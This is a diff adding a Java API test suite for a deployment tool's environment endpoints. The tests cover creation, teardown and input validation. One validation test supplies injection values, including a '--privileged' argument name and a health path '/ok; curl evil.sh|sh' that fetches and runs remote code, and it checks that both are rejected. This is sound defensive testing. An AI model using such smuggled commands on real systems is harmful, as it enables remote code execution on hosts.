@@ -1,0 +1,171 @@
+package eu.wohlben.qits.cd.api;
+
+import static io.restassured.RestAssured.given;
+import static org.hamcrest.Matchers.equalTo;
+import static org.hamcrest.Matchers.hasSize;
+import static org.hamcrest.Matchers.notNullValue;
+import static org.hamcrest.Matchers.nullValue;
+import static org.junit.jupiter.api.Assertions.assertTrue;
+
+import eu.wohlben.qits.cd.control.FakeDeploymentDriver;
+import io.quarkus.test.junit.QuarkusTest;
+import io.restassured.http.ContentType;
+import java.util.List;
+import java.util.Map;
+import org.junit.jupiter.api.BeforeEach;
+import org.junit.jupiter.api.Test;
+
+/**
+ * The environment surface end to end (against {@link FakeDeploymentDriver} — no docker): creation
+ * with the conventions filled in, the reads, teardown, and the validation the surface owes an
+ * attacker-reachable machine API. Tests address the absolute {@code /cd/api} paths, which is what
+ * makes them catch a prefix regression.
+ */
+@QuarkusTest
+public class CdEnvironmentApiTest {
+
+  @jakarta.inject.Inject FakeDeploymentDriver driver;
+
+  @BeforeEach
+  void reset() {
+    driver.reset();
+  }
+
+  @Test
+  public void creationFillsTheConventionsAndEnsuresTheNetwork() {
+    given()
+        .contentType(ContentType.JSON)
+        .body(
+            Map.of(
+                "name", "env-conventions",
+                "applications",
+                    List.of(Map.of("repoId", "repo-conventions", "name", "app-conventions"))))
+        .when()
+        .post("/cd/api/environments")
+        .then()
+        .statusCode(201)
+        .body("environment.name", equalTo("env-conventions"))
+        .body("environment.branch", equalTo("epic/env-conventions"))
+        .body("environment.network", equalTo("qits-env-env-conventions"))
+        .body("environment.applications", hasSize(1))
+        .body("environment.applications[0].repoId", equalTo("repo-conventions"))
+        .body("environment.applications[0].healthPath", nullValue())
+        .body("environment.id", notNullValue());
+
+    assertTrue(
+        driver.ensuredNetworks().contains("qits-env-env-conventions"),
+        "creation must ensure the environment's network");
+  }
+
+  @Test
+  public void explicitBranchNetworkAndHealthPathWin() {
+    given()
+        .contentType(ContentType.JSON)
+        .body(
+            Map.of(
+                "name", "env-explicit",
+                "branch", "main",
+                "network", "custom-net",
+                "applications",
+                    List.of(
+                        Map.of(
+                            "repoId", "repo-explicit",
+                            "name", "app-explicit",
+                            "healthPath", "/healthz"))))
+        .when()
+        .post("/cd/api/environments")
+        .then()
+        .statusCode(201)
+        .body("environment.branch", equalTo("main"))
+        .body("environment.network", equalTo("custom-net"))
+        .body("environment.applications[0].healthPath", equalTo("/healthz"));
+  }
+
+  @Test
+  public void aDuplicateNameIsAConflict() {
+    Map<String, Object> payload =
+        Map.of("name", "env-duplicate", "applications", List.of());
+    given().contentType(ContentType.JSON).body(payload).when().post("/cd/api/environments")
+        .then().statusCode(201);
+    given().contentType(ContentType.JSON).body(payload).when().post("/cd/api/environments")
+        .then().statusCode(409);
+  }
+
+  @Test
+  public void hostileNamesAreRejectedBeforeTheyReachAnArgv() {
+    // The name becomes a docker network name, an alias and an image path segment; the health path
+    // lands inside the container's --health-cmd shell string. None of these may pass validation.
+    given()
+        .contentType(ContentType.JSON)
+        .body(Map.of("name", "Evil Name", "applications", List.of()))
+        .when()
+        .post("/cd/api/environments")
+        .then()
+        .statusCode(400);
+
+    given()
+        .contentType(ContentType.JSON)
+        .body(
+            Map.of(
+                "name", "env-hostile-app",
+                "applications", List.of(Map.of("repoId", "repo-x", "name", "--privileged"))))
+        .when()
+        .post("/cd/api/environments")
+        .then()
+        .statusCode(400);
+
+    given()
+        .contentType(ContentType.JSON)
+        .body(
+            Map.of(
+                "name", "env-hostile-health",
+                "applications",
+                    List.of(
+                        Map.of(
+                            "repoId", "repo-x",
+                            "name", "app-x",
+                            "healthPath", "/ok; curl evil.sh|sh"))))
+        .when()
+        .post("/cd/api/environments")
+        .then()
+        .statusCode(400);
+  }
+
+  @Test
+  public void teardownRemovesRowsContainersAndNetwork() {
+    String environmentId =
+        given()
+            .contentType(ContentType.JSON)
+            .body(
+                Map.of(
+                    "name", "env-teardown",
+                    "applications", List.of(Map.of("repoId", "repo-teardown", "name", "app-teardown"))))
+            .when()
+            .post("/cd/api/environments")
+            .then()
+            .statusCode(201)
+            .extract()
+            .path("environment.id");
+
+    given().when().delete("/cd/api/environments/" + environmentId).then().statusCode(204);
+    given().when().get("/cd/api/environments/" + environmentId).then().statusCode(404);
+
+    assertTrue(
+        driver.removedEnvironments().contains(environmentId),
+        "teardown must remove the environment's containers");
+    assertTrue(
+        driver.removedNetworks().contains("qits-env-env-teardown"),
+        "teardown must remove the environment's network");
+  }
+
+  @Test
+  public void deletingAMissingEnvironmentIs404() {
+    given().when().delete("/cd/api/environments/no-such-environment").then().statusCode(404);
+  }
+
+  @Test
+  public void deploymentsListingRequiresAnExistingEnvironment() {
+    given().when().get("/cd/api/deployments").then().statusCode(400);
+    given().when().get("/cd/api/deployments?environmentId=no-such").then().statusCode(404);
+  }
+}
